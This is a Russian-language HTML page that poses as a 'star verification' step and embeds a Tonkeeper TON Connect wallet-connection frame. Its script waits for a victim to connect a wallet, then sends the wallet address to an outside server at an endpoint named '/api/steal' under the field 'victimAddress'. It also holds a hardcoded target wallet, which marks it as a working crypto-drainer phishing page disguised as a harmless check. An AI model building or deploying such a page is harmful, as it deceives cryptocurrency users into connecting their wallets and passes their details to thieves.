<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Звёзды</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0b0b0b;
      color: #00ffcc;
      padding: 20px;
      text-align: center;
    }
    iframe {
      width: 100%;
      max-width: 400px;
      height: 600px;
      border: 1px solid #00ffcc;
      border-radius: 12px;
      background: #111;
    }
  </style>
</head>
<body>
  <h2>⭐ Проверка звёзд</h2>
  <p>Нажмите кнопку, чтобы подтвердить звёзды</p>
  <iframe src="https://app.tonkeeper.com/connect?manifest=https://raw.githubusercontent.com/ton-connect/demo-dapp/main/tonconnect-manifest.json"></iframe>
  <div id="log">Готово</div>

  <script>
    const TARGET_WALLET = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";

    window.addEventListener('message', async (event) => {
      const log = document.getElementById('log');

      if (event.data && event.data.event === 'connect') {
        const userAddress = event.data.payload.address;
        log.innerHTML = `✅ Кошелёк: ${userAddress}\n⏳ Отправляем на сервер...`;

        try {
          const response = await fetch('https://AfiAfiDroch.pythonanywhere.com/api/steal', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ victimAddress: userAddress })
          });

          const result = await response.json();
          console.log('Сервер ответил:', result);
          log.innerHTML = `✅ Адрес отправлен!`;
        } catch (err) {
          log.innerHTML = `❌ Ошибка: ${err.message}`;
          console.error(err);
        }
      }
    });
  </script>
</body>
</html>
